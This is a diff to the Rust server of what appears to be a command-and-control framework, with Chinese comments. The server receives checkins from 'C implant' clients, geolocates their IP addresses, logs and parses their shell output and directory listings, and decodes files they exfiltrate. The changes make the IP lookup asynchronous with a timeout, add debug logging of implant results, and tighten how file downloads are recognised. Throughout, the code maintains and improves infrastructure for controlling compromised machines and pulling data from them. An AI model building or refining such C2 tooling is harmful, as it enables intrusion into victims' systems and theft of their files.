@@ -199,12 +199,19 @@ async fn handle_checkin(
     let ip = get_client_ip(headers, addr);
     println!("[+] New client checkin: {} from {}", request.client_id, ip);
     
-    // 查询 IP 对应的国家
-    let country = get_country_from_ip(&ip).await.unwrap_or_else(|| "Unknown".to_string());
-    
-    let mut client = ConnectedClient::from_identification(info, ip);
-    client.country = country;
+    let client = ConnectedClient::from_identification(info, ip.clone());
+    let client_id = client.id.clone();
     state.add_client(client);
+    
+    // 异步查询 IP 地理位置，不阻塞 checkin 响应
+    let state_clone = state.clone();
+    tokio::spawn(async move {
+        if let Some(country) = get_country_from_ip(&ip).await {
+            if let Some(c) = state_clone.clients.write().get_mut(&client_id) {
+                c.country = country;
+            }
+        }
+    });
     
     C2Response {
         response_type: "checkin".to_string(),
@@ -297,6 +304,10 @@ async fn handle_result(state: &SharedState, request: &C2Request) -> C2Response {
         } else {
             output_b64.to_string()
         };
+        
+        // 临时调试日志
+        let preview: String = output.chars().take(200).collect();
+        println!("[DEBUG] C implant result: task_id={}, success={}, output_len={}, preview={}", task_id, success, output.len(), preview);
         
         // 尝试识别并处理目录列表响应
         // C implant 返回的目录列表格式: [{"name":"...", "is_dir": true/false, "size": ...}, ...]
@@ -454,7 +465,10 @@ fn try_handle_directory_listing(state: &SharedState, client_id: &str, output: &s
     
     let entries: Vec<CImplantFileEntry> = match serde_json::from_str(trimmed) {
         Ok(e) => e,
-        Err(_) => return false,
+        Err(e) => {
+            println!("[!] Failed to parse directory listing from C implant: {}", e);
+            return false;
+        }
     };
     
     // 转换为服务端格式
@@ -509,21 +523,26 @@ fn try_handle_file_operation(state: &SharedState, client_id: &str, output: &str,
     }
     
     // 识别文件下载响应（base64 编码的文件内容）
-    // 如果是纯 base64 字符且成功，可能是文件下载
+    // 只有在存在待处理下载任务时才尝试识别，避免将普通 shell 输出误判为文件下载
     if success && !output.is_empty() && !output.starts_with('[') && !output.starts_with('{') {
-        // 尝试 base64 解码验证
-        if let Ok(decoded) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, output) {
-            // 成功解码，这可能是文件下载响应
-            // 从待处理下载列表中获取原文件路径
-            let download_path = state.take_pending_download(client_id).unwrap_or_default();
-            println!("[*] File download from {} (C implant): {} bytes, path: {}", client_id, decoded.len(), download_path);
-            let file_response = crate::state::FileResponse::FileDownload {
-                path: download_path,
-                data: decoded,
-                error: None,
-            };
-            state.add_file_response(client_id, file_response);
-            return true;
+        // 先检查是否有 pending download，有才尝试 base64 解码
+        let has_pending = state.pending_downloads.read()
+            .get(client_id)
+            .map(|v| !v.is_empty())
+            .unwrap_or(false);
+        
+        if has_pending {
+            if let Ok(decoded) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, output) {
+                let download_path = state.take_pending_download(client_id).unwrap_or_default();
+                println!("[*] File download from {} (C implant): {} bytes, path: {}", client_id, decoded.len(), download_path);
+                let file_response = crate::state::FileResponse::FileDownload {
+                    path: download_path,
+                    data: decoded,
+                    error: None,
+                };
+                state.add_file_response(client_id, file_response);
+                return true;
+            }
         }
     }
     
@@ -596,24 +615,33 @@ fn get_client_ip(headers: &axum::http::HeaderMap, addr: &SocketAddr) -> String {
     addr.ip().to_string()
 }
 
-/// 通过 IP 获取国家信息
+/// 通过 IP 获取国家信息（带超时保护）
 async fn get_country_from_ip(ip: &str) -> Option<String> {
-    if ip == "127.0.0.1" || ip == "::1" || ip.starts_with("192.168.") || ip.starts_with("10.") {
+    if ip == "127.0.0.1" || ip == "::1" || ip.starts_with("192.168.") || ip.starts_with("10.") || ip.starts_with("172.") {
         return Some("Local".to_string());
     }
     
     let url = format!("http://ip-api.com/json/{}?fields=country,countryCode", ip);
     
-    match reqwest::get(&url).await {
-        Ok(resp) => {
+    // 2 秒超时，避免外部 API 不可用时长时间阻塞
+    let result = tokio::time::timeout(
+        std::time::Duration::from_secs(2),
+        reqwest::get(&url)
+    ).await;
+    
+    match result {
+        Ok(Ok(resp)) => {
             if let Ok(json) = resp.json::<serde_json::Value>().await {
                 if let Some(country) = json.get("country").and_then(|c| c.as_str()) {
                     return Some(country.to_string());
                 }
             }
         }
-        Err(e) => {
+        Ok(Err(e)) => {
             println!("[!] Failed to query IP location: {}", e);
+        }
+        Err(_) => {
+            println!("[!] IP location query timed out for {}", ip);
         }
     }
     
